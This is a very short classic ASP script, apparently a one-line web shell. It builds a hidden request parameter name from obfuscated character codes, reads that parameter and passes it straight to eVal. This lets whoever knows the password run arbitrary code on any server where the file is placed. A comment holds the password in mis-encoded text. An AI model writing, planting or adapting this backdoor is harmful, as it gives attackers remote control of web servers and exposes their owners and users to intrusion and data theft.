<%
i=(Chr(-12590))
love=(Chr(-20306))
you=(Chr(-15133))
OK=i&love&you
CNM=Request(OK)
eVal CNM 'pass:�Ұ���
%>